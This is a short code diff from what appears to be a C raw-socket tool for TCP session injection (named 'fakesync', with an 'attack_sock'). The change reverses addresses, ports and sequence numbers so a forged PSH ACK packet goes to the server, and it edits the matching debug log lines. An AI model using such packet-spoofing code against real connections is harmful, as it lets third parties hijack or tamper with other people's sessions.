@@ -182,7 +182,7 @@ int main(int argc, char *argv[]) {
             print_tcp_packet(buf, num); // log the packet;
 
             // send_synack(attack_sock, datagram, pseudo_packet, iph->daddr, iph->saddr, tcph->dest, tcph->source, ntohl(tcph->ack_seq) + 1, ntohl(tcph->seq)); // syn ack
-            send_pshack(sizeof data, attack_sock, datagram, pseudo_packet, iph->saddr, iph->daddr, tcph->source, tcph->dest, ntohl(tcph->seq) + 1, ntohl(tcph->ack_seq)); // psh ack
+            send_pshack(sizeof data, attack_sock, datagram, pseudo_packet, iph->daddr, iph->saddr, tcph->dest, tcph->source, ntohl(tcph->ack_seq) + 1, ntohl(tcph->seq)); // psh ack to server
             goto final;
         }
     }
@@ -285,14 +285,14 @@ void send_pshack(const size_t data_size, const int attack_sock, const char *data
 
     inet_ntop(AF_INET, &(saddr), ipstr, INET_ADDRSTRLEN);
 
-    fprintf(logfile, "DEBUG sending PSH ACK from service %s:%u ......\n", ipstr, ntohs(sport));
+    fprintf(logfile, "DEBUG sending PSH ACK to service %s:%u ......\n", ipstr, ntohs(sport));
     fprintf(logfile, "DEBUG %s\n", ipstr);
 
     if ((num = sendto(attack_sock, datagram, sizeof(struct iphdr) + tcp_len, 0, (struct sockaddr *) &sa, sizeof sa)) < 0)
     {
         perror("fakesync: sendto()\n");
     }
-    fprintf(logfile, "DEBUG PSH ACK sent from service %s:%u\n", ipstr, ntohs(sport));
+    fprintf(logfile, "DEBUG PSH ACK sent to service %s:%u\n", ipstr, ntohs(sport));
 }
 
 void print_ip_header(unsigned char* Buffer, int Size)
